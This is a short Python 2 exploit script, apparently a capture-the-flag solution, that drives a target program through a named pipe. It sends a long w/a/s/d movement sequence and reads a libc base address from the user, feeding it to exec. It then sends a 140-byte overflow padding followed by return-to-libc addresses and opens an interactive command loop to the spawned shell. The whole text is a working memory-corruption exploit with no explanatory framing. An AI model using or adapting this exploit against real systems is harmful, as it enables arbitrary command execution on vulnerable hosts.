#!/usr/bin/env python2

import struct

f = open('fifo', 'w')

def send(cmd):
    global f
    f.write(cmd)
    f.flush()

send('b')
s = 'd' * 28 + 's' * 3 + 'd' * 2 + 'w' * 5 + 'a' * 23 + 's' * 11 + 'd'* 27 + 'w' + 'w' * 3 + 'a' * 27 + 'w' * 5 + 'd' * 50 + 's' * 2 + 'a' * 38 + 's' * 11 + 'd' * 7 + 'w' * 7 + 'a' * 6 + 'w' * 9 + 'd' * 17 + 'd' * 2  + 'd' * 23 + 's' * 17 + 'd' * 6

send(s)

b = raw_input('please enter base address: ')

ba = "base = 0x" + b
print ba
exec ba

#base = 0xf75fe000
g = 'A' * 140 + struct.pack('I', base + 0x3e6c0) + struct.pack('I', base + 0x3e6c0 - 0xd1d0) + struct.pack('I', base + 0x160cbf) + struct.pack('I', 10) + 'pwd\n'

send(g)

while True:
    send(raw_input('$ ') + '\n\n')

raw_input("\npress any key to exit ...")
